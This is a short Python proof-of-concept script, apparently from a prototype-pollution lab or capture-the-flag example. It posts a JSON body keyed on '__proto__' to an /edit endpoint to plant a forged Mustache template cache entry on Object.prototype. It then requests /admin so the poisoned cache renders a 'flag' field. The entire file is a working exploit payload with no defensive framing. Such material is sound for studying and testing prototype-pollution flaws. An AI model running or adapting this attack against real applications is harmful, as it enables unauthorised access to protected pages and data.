import requests
import json
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", 8002)


# Step 1: Object.prototype[<mustache cache>] = <fake template token>
with open("../ppexamples/mustache/views/admin.html", "r") as f:
    template = f.read()

cache_key = template + ":{{:}}"
cache_val = [["name", "flag", 0, 100]]
r = requests.post(f"http://{HOST}:{PORT}/edit",
                  headers={"Content-Type": "application/json"},
                  data=json.dumps({"ip": "__proto__",
                                   "index": cache_key,
                                   "memo": cache_val}))
print('Complete PP, response: ', r.text)

# Step 2: Trigger the rendering / cache lookup
r = requests.get(f"http://{HOST}:{PORT}/admin")
print(r.text)
